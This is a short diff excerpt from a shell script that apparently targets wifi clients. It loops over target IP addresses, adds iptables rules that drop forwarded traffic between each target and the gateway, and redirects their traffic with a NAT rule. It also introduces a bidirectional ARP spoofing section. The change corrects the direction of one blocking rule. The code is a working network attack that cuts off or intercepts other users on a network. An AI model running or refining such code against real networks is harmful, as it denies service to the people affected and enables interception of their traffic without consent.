@@ -85,7 +85,7 @@ for TARGET in $TARGET_IPS; do
 
     # Block all traffic of the target wifi clients
         iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
-        iptables -I FORWARD -d "$GATEWAY" -s "$TARGET" -j DROP
+        iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP
         iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
     (
         # Bidirectional ARP Spoofing
